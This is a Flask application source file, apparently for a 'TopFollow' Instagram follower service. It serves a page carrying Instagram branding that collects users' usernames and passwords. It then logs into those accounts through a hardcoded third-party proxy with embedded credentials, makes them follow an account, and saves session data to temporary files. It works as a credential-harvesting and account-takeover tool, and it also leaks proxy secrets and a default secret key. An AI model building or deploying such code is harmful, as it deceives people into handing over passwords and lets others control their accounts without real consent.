import os
import sys
import json
import time
import logging
import traceback
import subprocess
import tempfile
import threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from dotenv import load_dotenv

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY", "secret-key-123")

# BELLEK İÇİ VERİ DEPOLAMA
accounts_lock = threading.Lock()
accounts_store = {}

# PROXY
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"
logger.info(f"Proxy: {PROXY_URL[:30]}...")

def get_account(username):
    with accounts_lock:
        return accounts_store.get(username.lower())

def save_account(username, data):
    with accounts_lock:
        accounts_store[username.lower()] = {
            'username': username,
            'password_hash': data.get('password_hash', ''),
            'status': data.get('status', 'Beklemede'),
            'login_attempts': data.get('login_attempts', 0),
            'last_login': data.get('last_login'),
            'challenge_pending': data.get('challenge_pending', False),
            'challenge_type': data.get('challenge_type'),
            'raw_error': data.get('raw_error'),
            'created_at': data.get('created_at', datetime.now().isoformat())
        }

# DÜZELTİLMİŞ SCRIPT - stdout'a SADECE JSON yazılır!
LOGIN_SCRIPT = r'''
import sys
import json
import time
import os

# Log dosyası - ayrı tut
LOG_FILE = f"/tmp/ig_fixed_{sys.argv[1] if len(sys.argv) > 1 else 'unknown'}.log"
log_f = open(LOG_FILE, "w", buffering=1)

def log(msg):
    timestamp = time.strftime('%H:%M:%S')
    line = f"{timestamp} | {msg}"
    log_f.write(line + "\n")
    log_f.flush()
    # SADECE dosyaya yaz, stderr'e değil! (stdout karışmasın)

# BAŞLANGIÇ
USERNAME = sys.argv[1] if len(sys.argv) > 1 else ""
PASSWORD = sys.argv[2] if len(sys.argv) > 2 else ""
PROXY = sys.argv[3] if len(sys.argv) > 3 else None

log("=" * 50)
log(f"SCRIPT BAŞLADI")
log(f"Username: {USERNAME}")
log(f"Password: {'*' * len(PASSWORD)} ({len(PASSWORD)} chars)")
log(f"Proxy: {PROXY[:20] + '...' if PROXY else 'YOK'}")

if not PASSWORD:
    log("HATA: Şifre boş!")
    # SADECE stdout'a JSON yaz
    print(json.dumps({"status": "error", "error": "Şifre boş"}), flush=True)
    sys.exit(1)

# INSTAGRAPI IMPORT
log("Import başlıyor...")
try:
    from instagrapi import Client
    from instagrapi.exceptions import (
        ChallengeRequired, LoginRequired, 
        PleaseWaitFewMinutes, BadPassword,
        TwoFactorRequired, ClientError
    )
    log("Import OK")
except Exception as e:
    log(f"Import HATASI: {e}")
    print(json.dumps({"status": "error", "error": f"Import: {str(e)}"}), flush=True)
    sys.exit(1)

# ANA İŞLEM
def main():
    try:
        log("Client oluşturuluyor...")
        cl = Client()
        
        if PROXY and PROXY != "None":
            try:
                cl.set_proxy(PROXY)
                log("Proxy OK")
            except Exception as e:
                log(f"Proxy hatası: {e}")
        
        cl.request_timeout = 60
        cl.delay_range = [2, 5]
        
        log("")
        log("LOGIN DENEYİ...")
        login_start = time.time()
        
        try:
            cl.login(USERNAME, PASSWORD)
            login_time = time.time() - login_start
            log(f"LOGIN BAŞARILI! ({login_time:.1f}s)")
            
            # Takip et
            try:
                insta_id = cl.user_id_from_username("instagram")
                cl.user_follow(insta_id)
                log("Takip OK")
                result = {
                    "status": "success",
                    "message": f"Giriş ve takip başarılı ({login_time:.1f}s)"
                }
            except Exception as e:
                log(f"Takip hatası: {e}")
                result = {
                    "status": "success",
                    "message": f"Giriş başarılı ({login_time:.1f}s)"
                }
            
        except BadPassword as e:
            login_time = time.time() - login_start
            log(f"BadPassword ({login_time:.1f}s): {e}")
            result = {
                "status": "bad_password",
                "error": "Şifre yanlış veya hesap kısıtlı",
                "time": f"{login_time:.1f}s"
            }
            
        except ChallengeRequired as e:
            login_time = time.time() - login_start
            log(f"ChallengeRequired ({login_time:.1f}s)")
            # Session kaydet
            try:
                settings = cl.get_settings()
                session_file = f"/tmp/ig_session_{USERNAME}.json"
                with open(session_file, 'w') as f:
                    json.dump(settings, f)
                log(f"Session kaydedildi: {session_file}")
            except Exception as save_err:
                log(f"Session kaydetme hatası: {save_err}")
            
            result = {
                "status": "challenge_required",
                "challenge_type": "code",
                "message": f"Doğrulama kodu gerekli! ({login_time:.1f}s)",
                "hint": "E-postanıza kod gönderildi"
            }
            
        except TwoFactorRequired as e:
            login_time = time.time() - login_start
            log(f"TwoFactorRequired ({login_time:.1f}s)")
            result = {
                "status": "2fa_required",
                "challenge_type": "2fa",
                "message": "2FA kodu gerekli"
            }
            
        except Exception as e:
            login_time = time.time() - login_start
            log(f"Beklenmeyen hata ({login_time:.1f}s): {type(e).__name__}: {e}")
            import traceback
            log(f"Traceback: {traceback.format_exc()}")
            result = {
                "status": "error",
                "error": f"{type(e).__name__}: {str(e)}",
                "time": f"{login_time:.1f}s"
            }
        
        # SADECE stdout'a JSON yaz (flush=True ile anında)
        log(f"Sonuç: {result}")
        print(json.dumps(result), flush=True)
        log("JSON stdout'a yazıldı")
        
    except Exception as e:
        log(f"Dış hata: {e}")
        print(json.dumps({"status": "error", "error": f"Dış hata: {str(e)}"}), flush=True)
    finally:
        try:
            cl.logout()
        except:
            pass
        log_f.close()

if __name__ == "__main__":
    main()
'''

def run_subprocess(username, password):
    """Subprocess çalıştır - DÜZELTİLMİŞ"""
    if not password:
        return {"status": "error", "error": "Şifre boş"}
    
    script_content = LOGIN_SCRIPT.replace("{USERNAME}", username)
    
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False, dir='/tmp') as f:
        f.write(script_content)
        script_path = f.name
    
    logger.info(f"[{username}] Subprocess başlatılıyor...")
    
    try:
        env = os.environ.copy()
        env['PYTHONUNBUFFERED'] = '1'
        
        # communicate() kullan - daha güvenilir
        result = subprocess.run(
            [sys.executable, '-u', script_path, username, password, PROXY_URL or "None"],
            capture_output=True,
            text=True,
            timeout=120,
            cwd='/tmp',
            env=env
        )
        
        # Temizlik
        try:
            os.unlink(script_path)
        except:
            pass
        
        # Log dosyasını oku (ayrı)
        log_file_path = f"/tmp/ig_fixed_{username}.log"
        try:
            with open(log_file_path, 'r') as f:
                logs = f.read()
                if logs:
                    logger.info(f"[{username}] Loglar:\n{logs[-400:]}")
        except Exception as e:
            logger.warning(f"[{username}] Log okunamadı: {e}")
        
        # ÖNEMLİ: stdout ve stderr'yi AYRIŞTIR
        stdout = result.stdout.strip()
        stderr = result.stderr.strip()
        
        logger.info(f"[{username}] Return code: {result.returncode}")
        logger.info(f"[{username}] Stdout: {stdout[:200]}")
        logger.info(f"[{username}] Stderr: {stderr[:200] if stderr else 'Boş'}")
        
        # Hata kodu varsa ve stdout boşsa stderr'den dene
        if result.returncode != 0 and not stdout:
            logger.error(f"[{username}] Process hatası, stderr: {stderr[:200]}")
            return {"status": "error", "error": f"Process hatası: {stderr[:150]}"}
        
        # JSON'u stdout'dan bul
        if stdout:
            # Son satırı dene
            lines = stdout.split('\n')
            for line in reversed(lines):
                line = line.strip()
                if line and line.startswith('{') and line.endswith('}'):
                    try:
                        parsed = json.loads(line)
                        logger.info(f"[{username}] JSON parse başarılı")
                        return parsed
                    except json.JSONDecodeError as e:
                        logger.warning(f"[{username}] JSON parse hatası: {e}, line: {line[:100]}")
                        continue
        
        # Hiç JSON bulunamadı
        logger.error(f"[{username}] JSON bulunamadı. Raw stdout: {stdout[:300]}")
        return {"status": "error", "error": f"JSON bulunamadı. Output: {stdout[:150]}"}
        
    except subprocess.TimeoutExpired:
        logger.error(f"[{username}] Timeout")
        return {"status": "error", "error": "Zaman aşımı (120s)"}
    except Exception as e:
        logger.error(f"[{username}] Exception: {e}")
        import traceback
        logger.error(traceback.format_exc())
        return {"status": "error", "error": str(e)}

def do_login_task(username, password):
    """Background task"""
    acc = get_account(username)
    if not acc:
        save_account(username, {
            'status': 'Giriş deneniyor...',
            'login_attempts': 1,
            'created_at': datetime.now().isoformat()
        })
    else:
        save_account(username, {
            **acc,
            'status': 'Giriş deneniyor...',
            'login_attempts': acc.get('login_attempts', 0) + 1
        })
    
    result = run_subprocess(username, password)
    
    status = result.get("status")
    current_acc = get_account(username) or {}
    
    if status == "success":
        save_account(username, {
            **current_acc,
            'status': "AKTİF ✅ - " + result.get("message", "Başarılı"),
            'last_login': datetime.now().isoformat(),
            'challenge_pending': False
        })
    elif status == "challenge_required":
        save_account(username, {
            **current_acc,
            'status': "🔐 DOĞRULAMA KODU GEREKLİ",
            'challenge_type': result.get("challenge_type", "code"),
            'challenge_pending': True,
            'raw_error': json.dumps(result)
        })
    elif status == "2fa_required":
        save_account(username, {
            **current_acc,
            'status': "🔐 2FA KODU GEREKLİ",
            'challenge_type': "2fa",
            'challenge_pending': True,
            'raw_error': json.dumps(result)
        })
    elif status == "bad_password":
        save_account(username, {
            **current_acc,
            'status': "⚠️ Şifre yanlış veya hesap kısıtlı (" + result.get("time", "?") + ")",
            'raw_error': json.dumps(result)
        })
    else:
        save_account(username, {
            **current_acc,
            'status': "HATA ❌ - " + result.get("error", "Bilinmeyen hata")[:80],
            'raw_error': json.dumps(result)
        })

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    try:
        data = request.get_json()
        username = data.get('u', '').strip().lower()
        password = data.get('p', '')
        
        if not username or not password:
            return jsonify(status="error", message="Eksik bilgi"), 400
        
        acc = get_account(username)
        if not acc:
            save_account(username, {
                'status': 'Başlatılıyor...',
                'login_attempts': 0,
                'created_at': datetime.now().isoformat()
            })
        
        t = threading.Thread(
            target=do_login_task,
            args=(username, password),
            daemon=True
        )
        t.start()
        
        return jsonify(
            status="started",
            username=username,
            message="Giriş başlatıldı"
        )
        
    except Exception as e:
        logger.error(f"Connect hatası: {e}")
        return jsonify(status="error", message=str(e)), 500

@app.route('/api/status/<username>')
def get_status(username):
    acc = get_account(username.lower())
    
    if not acc:
        return jsonify(
            status="Hesap bulunamadı", 
            exists=False,
            username=username
        )
    
    return jsonify(
        status=acc.get('status', 'Bekleniyor...'),
        exists=True,
        attempts=acc.get('login_attempts', 0),
        last_login=acc.get('last_login'),
        challenge_pending=acc.get('challenge_pending', False),
        challenge_type=acc.get('challenge_type'),
        raw_error=acc.get('raw_error', '')[:300] if acc.get('raw_error') else None
    )

@app.route('/api/health')
def health():
    return jsonify(
        status="ok",
        storage="in-memory",
        accounts_count=len(accounts_store),
        mode="stdout-json-fixed"
    )

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TopFollow - Fixed</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .page { display: none; }
        .active { display: flex; }
        .hidden { display: none !important; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .animate-fade-in { animation: fadeIn 0.4s ease-out; }
        .loader { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="bg-gradient-to-br from-purple-600 via-purple-500 to-blue-500 min-h-screen font-sans text-white">

    <!-- Login Page -->
    <div id="p1" class="page active flex-col items-center justify-center min-h-screen p-6 animate-fade-in">
        <div class="w-full max-w-[340px]">
            <div class="text-center mb-12">
                <div class="w-20 h-20 bg-white/20 rounded-3xl flex items-center justify-center mx-auto mb-4 backdrop-blur-sm shadow-lg">
                    <svg class="w-10 h-10 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
                </div>
                <h1 class="text-3xl font-bold mb-1">Instagram</h1>
                <p class="text-white/70 text-sm">TopFollow Bağlantısı</p>
                <p class="text-white/40 text-xs mt-2">Stdout JSON Fixed</p>
            </div>
            
            <div class="space-y-4">
                <div class="bg-white/10 backdrop-blur-md rounded-xl p-1 border border-white/20">
                    <input id="u" type="text" placeholder="Kullanıcı adı" 
                           class="w-full bg-transparent text-white placeholder-white/60 p-4 outline-none text-base"
                           autocomplete="username">
                </div>
                
                <div class="bg-white/10 backdrop-blur-md rounded-xl p-1 border border-white/20">
                    <input id="p" type="password" placeholder="Şifre" 
                           class="w-full bg-transparent text-white placeholder-white/60 p-4 outline-none text-base"
                           autocomplete="current-password">
                </div>
                
                <button onclick="giris()" id="btn" 
                        class="w-full bg-white text-purple-600 p-4 rounded-xl font-bold text-lg shadow-lg hover:bg-gray-100 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center mt-6">
                    <div id="btnLoader" class="loader hidden border-purple-600 border-t-transparent"></div>
                    <span id="btnText">Giriş Yap</span>
                </button>
            </div>
            
            <div id="errorBox" class="hidden mt-6 p-4 bg-red-500/30 border border-red-400/50 rounded-xl text-center text-sm backdrop-blur-sm"></div>
        </div>
    </div>

    <!-- Status Page -->
    <div id="p2" class="page flex-col items-center justify-center min-h-screen p-6 bg-gray-50 text-gray-800 hidden">
        <div class="w-full max-w-[340px] animate-fade-in">
            <div class="bg-white rounded-3xl shadow-xl p-8 text-center mb-6 border-b-4 border-purple-500">
                <div class="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-4">
                    <div id="statusIcon" class="w-4 h-4 bg-purple-500 rounded-full animate-pulse"></div>
                </div>
                
                <h2 id="msg" class="text-xl font-bold text-gray-800 mb-2">Bağlanıyor...</h2>
                <p id="subMsg" class="text-gray-500 text-sm">İşlem devam ediyor</p>
                
                <div id="rawError" class="hidden mt-3 p-2 bg-gray-100 rounded text-xs text-left font-mono break-all max-h-32 overflow-y-auto"></div>
            </div>

            <div class="bg-white rounded-2xl shadow-md p-5 mb-4">
                <div class="flex justify-between items-center mb-3 pb-3 border-b border-gray-100">
                    <span class="text-gray-500 text-sm">Kullanıcı</span>
                    <span id="utag" class="font-bold text-gray-800">@username</span>
                </div>
                <div class="flex justify-between items-center">
                    <span class="text-gray-500 text-sm">Durum</span>
                    <span id="statusBadge" class="bg-yellow-100 text-yellow-700 px-3 py-1 rounded-full text-xs font-bold">Bekliyor</span>
                </div>
            </div>

            <button onclick="checkNow()" id="checkBtn"
                    class="w-full bg-purple-600 text-white p-4 rounded-xl font-bold mb-3 hover:bg-purple-700 transition-all active:scale-[0.98] shadow-lg">
                Durumu Kontrol Et
            </button>
            
            <button onclick="toggleDebug()" 
                    class="w-full bg-gray-200 text-gray-600 p-3 rounded-xl font-semibold text-sm mb-3 hover:bg-gray-300 transition-all">
                🔍 Teknik Detaylar
            </button>
            
            <button onclick="location.reload()" 
                    class="w-full bg-gray-200 text-gray-700 p-4 rounded-xl font-bold hover:bg-gray-300 transition-all active:scale-[0.98]">
                Yeniden Dene
            </button>
            
            <p class="text-center text-gray-400 text-xs mt-6">
                Otomatik: <span id="timer" class="font-bold text-purple-600">5</span>s
            </p>
        </div>
    </div>

    <script>
        let currentUser = "";
        let checkInterval = null;
        let countdown = 5;

        function showError(msg) {
            const box = document.getElementById('errorBox');
            box.textContent = msg;
            box.classList.remove('hidden');
            
            const btn = document.getElementById('btn');
            btn.disabled = false;
            document.getElementById('btnText').classList.remove('hidden');
            document.getElementById('btnLoader').classList.add('hidden');
        }

        function toggleDebug() {
            document.getElementById('rawError').classList.toggle('hidden');
        }

        async function giris() {
            const u = document.getElementById('u').value.trim().toLowerCase();
            const p = document.getElementById('p').value;

            if (!u || !p) {
                showError('Kullanıcı adı ve şifre girin');
                return;
            }

            currentUser = u;

            const btn = document.getElementById('btn');
            btn.disabled = true;
            document.getElementById('btnText').classList.add('hidden');
            document.getElementById('btnLoader').classList.remove('hidden');
            document.getElementById('errorBox').classList.add('hidden');

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);

                const res = await fetch('/api/connect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: u, p: p}),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
                const data = await res.json();

                if (!res.ok && data.status === 'error') {
                    throw new Error(data.message || 'Sunucu hatası');
                }

                document.getElementById('p1').classList.add('hidden');
                document.getElementById('p1').classList.remove('active');
                document.getElementById('p2').classList.remove('hidden');
                document.getElementById('p2').classList.add('active');
                document.getElementById('utag').textContent = '@' + u;
                
                startChecking();

            } catch (err) {
                if (err.name === 'AbortError') {
                    showError('Sunucu yanıt vermiyor - Tekrar deneyin');
                } else {
                    showError(err.message);
                }
                
                btn.disabled = false;
                document.getElementById('btnText').classList.remove('hidden');
                document.getElementById('btnLoader').classList.add('hidden');
            }
        }

        function startChecking() {
            checkStatus();
            checkInterval = setInterval(() => {
                checkStatus();
                countdown = 5;
            }, 4000);
            
            setInterval(() => {
                if (countdown > 0) {
                    countdown--;
                    document.getElementById('timer').textContent = countdown;
                } else {
                    countdown = 5;
                }
            }, 1000);
        }

        async function checkNow() {
            const btn = document.getElementById('checkBtn');
            const originalText = btn.textContent;
            btn.disabled = true;
            btn.textContent = 'Kontrol ediliyor...';
            
            await checkStatus();
            
            setTimeout(() => {
                btn.disabled = false;
                btn.textContent = originalText;
            }, 800);
        }

        async function checkStatus() {
            if (!currentUser) return;
            
            try {
                const res = await fetch('/api/status/' + currentUser);
                const data = await res.json();
                
                const msgEl = document.getElementById('msg');
                const iconEl = document.getElementById('statusIcon');
                const badge = document.getElementById('statusBadge');
                const subMsg = document.getElementById('subMsg');
                const rawErrorDiv = document.getElementById('rawError');
                
                msgEl.textContent = data.status || 'Bekleniyor...';
                
                if (data.raw_error) {
                    rawErrorDiv.textContent = data.raw_error;
                }
                
                if (data.status.includes('✅')) {
                    badge.className = 'bg-green-100 text-green-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Aktif';
                    iconEl.className = 'w-4 h-4 bg-green-500 rounded-full';
                    subMsg.textContent = 'Başarıyla bağlandı!';
                    clearInterval(checkInterval);
                } else if (data.status.includes('🔐')) {
                    badge.className = 'bg-yellow-100 text-yellow-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Kod Gerekli';
                    iconEl.className = 'w-4 h-4 bg-yellow-500 rounded-full animate-bounce';
                    subMsg.textContent = 'E-postanıza kod gönderildi';
                } else if (data.status.includes('⚠️')) {
                    badge.className = 'bg-orange-100 text-orange-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Kontrol';
                    iconEl.className = 'w-4 h-4 bg-orange-500 rounded-full animate-pulse';
                } else if (data.status.includes('❌') || data.status.includes('HATA')) {
                    badge.className = 'bg-red-100 text-red-700 px-3 py-1 rounded-full text-xs font-bold';
                    badge.textContent = 'Hata';
                    iconEl.className = 'w-4 h-4 bg-red-500 rounded-full';
                }

            } catch (e) {
                console.error('Status error:', e);
            }
        }

        document.getElementById('p').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') giris();
        });
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    port = int(os.getenv("PORT", 10000))
    logger.info(f"🚀 Sunucu başlatılıyor: 0.0.0.0:{port}")
    logger.info(f"✅ Stdout JSON fixed - stderr ayrı")
    
    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
